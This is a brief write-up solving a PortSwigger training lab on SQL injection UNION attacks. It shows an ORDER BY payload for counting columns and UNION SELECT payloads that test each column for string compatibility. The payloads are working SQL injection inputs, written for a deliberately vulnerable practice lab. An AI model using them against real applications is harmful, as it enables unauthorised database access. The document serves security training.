# Lab-08 SQL Injection

## SQL injection UNION attack, finding a column containing text

### Problem

- his lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data

### Solution

- GOto product category filter and use 'ORDER by' to determine the number of column:`'Order by 3--+`

- Then we use 'UNION SELECT' to find the number of column contain text:
```SQL
-- It's 'q5hEig' given by portswigger
'UNION SELECT 'q5hEig',NULL,NULL--+ 
-- If not solved move into next
'UNION SELECT NULL,'q5hEig',NULL--+
-- If not solved move into next
'UNION SELECT NULL,NULL,'q5hEig'--+
```

- Lab Solved!!! 
